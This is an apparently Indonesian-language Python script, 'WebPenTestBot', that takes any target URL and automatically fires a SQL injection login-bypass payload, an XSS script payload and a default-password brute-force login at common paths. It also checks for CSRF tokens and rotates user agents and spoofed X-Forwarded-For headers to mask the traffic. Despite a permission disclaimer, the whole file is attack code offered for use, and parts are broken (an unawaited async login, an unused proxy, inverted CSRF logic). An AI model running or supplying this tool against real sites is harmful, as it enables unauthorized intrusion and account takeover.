import requests
import asyncio
import aiohttp
import random
import time
import base64
import validators
from urllib.parse import quote_plus
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

class Colors:
    RESET = "\033[0m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"

class WebPenTestBot:
    def __init__(self, base_url, proxy=None, login_url=None, credentials=None):
        if not validators.url(base_url):
            raise ValueError("URL yang diberikan tidak valid")
        
        self.base_url = base_url
        self.proxy = proxy
        self.login_url = login_url
        self.credentials = credentials
        self.session = aiohttp.ClientSession()
        self.log_file = 'pentest_results.log'

        if self.login_url and self.credentials:
            self.login()

        print(f"{Colors.MAGENTA}Disclaimer: Pastikan Anda memiliki izin eksplisit untuk melakukan pengujian ini.{Colors.RESET}")

    def log(self, message, color=Colors.RESET):
        with open(self.log_file, 'a') as log:
            log.write(message + '\n')
        print(f"{color}{message}{Colors.RESET}")

    def obfuscate_payload(self, payload):
        encoded_payload = base64.b64encode(payload.encode()).decode()
        return encoded_payload

    def random_user_agent(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
        return random.choice(user_agents)

    def generate_random_headers(self):
        headers = {
            "User-Agent": self.random_user_agent(),
            "X-Forwarded-For": f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}",  # Randomize IP address
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json, text/javascript, */*; q=0.01",
        }
        return headers

    async def get_html(self, path, retries=3, timeout=5):
        url = self.base_url + path
        attempt = 0
        while attempt < retries:
            try:
                async with self.session.get(url, timeout=timeout, headers=self.generate_random_headers()) as response:
                    response.raise_for_status()
                    return await response.text()
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                attempt += 1
                self.log(f"{Colors.RED}[x] Gagal mengakses {url}, percobaan {attempt} dari {retries}: {str(e)}{Colors.RESET}")
                await asyncio.sleep(random.randint(1, 2))
        return None

    async def test_sql_injection(self, path):
        payload = "admin' OR '1'='1' -- "
        encoded_payload = self.obfuscate_payload(payload)
        url = self.base_url + path
        data = {"username": encoded_payload, "password": encoded_payload}
        
        async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
            if 'error' in await response.text():
                self.log(f"{Colors.YELLOW}[!] Eksploitasi SQL Injection berhasil menyebabkan error pada: {url}{Colors.RESET}")
            elif 'Welcome' in await response.text():
                self.log(f"{Colors.GREEN}[!] Eksploitasi SQL Injection berhasil, akses ke akun admin terbuka: {url}{Colors.RESET}")
            else:
                self.log(f"{Colors.RED}[x] Tidak ada SQL Injection di {url}{Colors.RESET}")

    async def test_xss(self, path):
        payload = "<script>alert('XSS Vulnerability')</script>"
        url = self.base_url + path
        data = {'input': payload}
        
        async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
            if payload in await response.text():
                self.log(f"{Colors.GREEN}[!] Cross-Site Scripting (XSS) berhasil pada: {url}{Colors.RESET}")
            else:
                self.log(f"{Colors.RED}[x] Tidak ada XSS di {url}{Colors.RESET}")

    async def test_csrf(self, path):
        url = self.base_url + path
        html = await self.get_html(path)
        if not html:
            self.log(f"{Colors.RED}[x] Tidak dapat memuat halaman untuk CSRF di {url}{Colors.RESET}")
            return

        soup = BeautifulSoup(html, 'html.parser')
        csrf_token = soup.find('input', {'name': 'csrf_token'})
        if csrf_token:
            self.log(f"{Colors.YELLOW}[!] CSRF Token ditemukan di {url}. Coba eksploitasi dengan payload CSRF.{Colors.RESET}")
        else:
            self.log(f"{Colors.GREEN}[+] Tidak ditemukan CSRF di {url}{Colors.RESET}")

    async def brute_force_login(self, path):
        url = self.base_url + path
        usernames = ['admin', 'user', 'test', 'guest']
        passwords = ['password123', '123456', 'admin', 'password']
        
        for username in usernames:
            for password in passwords:
                data = {'username': username, 'password': password}
                async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
                    if 'Welcome' in await response.text():
                        self.log(f"{Colors.GREEN}[+] Brute Force berhasil login dengan username: {username} dan password: {password}{Colors.RESET}")
                        return
                    else:
                        self.log(f"{Colors.RED}[x] Gagal login dengan username: {username} dan password: {password}{Colors.RESET}")

    async def analyze_site(self):
        paths = ['/login', '/admin', '/upload', '/search', '/user', '/config', '/files', '/data']
        tasks = []

        for path in paths:
            tasks.append(self.test_sql_injection(path))
            tasks.append(self.test_xss(path))
            tasks.append(self.test_csrf(path))
            tasks.append(self.brute_force_login(path))

        await asyncio.gather(*tasks)

    async def login(self):
        if self.login_url and self.credentials:
            login_page = await self.get_html(self.login_url)
            if login_page:
                async with self.session.post(self.base_url + self.login_url, data=self.credentials, headers=self.generate_random_headers()) as response:
                    if 'Welcome' in await response.text():
                        self.log(f"{Colors.GREEN}[+] Login berhasil!{Colors.RESET}")
                    else:
                        self.log(f"{Colors.RED}[x] Login gagal!{Colors.RESET}")
            else:
                self.log(f"{Colors.RED}[x] Tidak dapat mengakses halaman login.{Colors.RESET}")

async def main():
    target_url = input(f"{Colors.BLUE}Masukkan URL target (misal: http://example.com): {Colors.RESET}").strip()
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        print(f"{Colors.RED}URL tidak valid. Pastikan URL dimulai dengan http:// atau https://{Colors.RESET}")
    else:
        proxy = input(f"{Colors.CYAN}Masukkan proxy (misal: http://127.0.0.1:8080) atau tekan Enter untuk melewati: {Colors.RESET}")
        login_url = input(f"{Colors.YELLOW}Masukkan URL login (misal: /login) atau tekan Enter untuk melewati: {Colors.RESET}")
        if login_url:
            username = input(f"{Colors.GREEN}Masukkan username untuk login: {Colors.RESET}")
            password = input(f"{Colors.GREEN}Masukkan password untuk login: {Colors.RESET}")
            credentials = {'username': username, 'password': password}
        else:
            credentials = None

        bot = WebPenTestBot(target_url, proxy if proxy else None, login_url, credentials)
        await bot.analyze_site()

if __name__ == "__main__":
    asyncio.run(main())
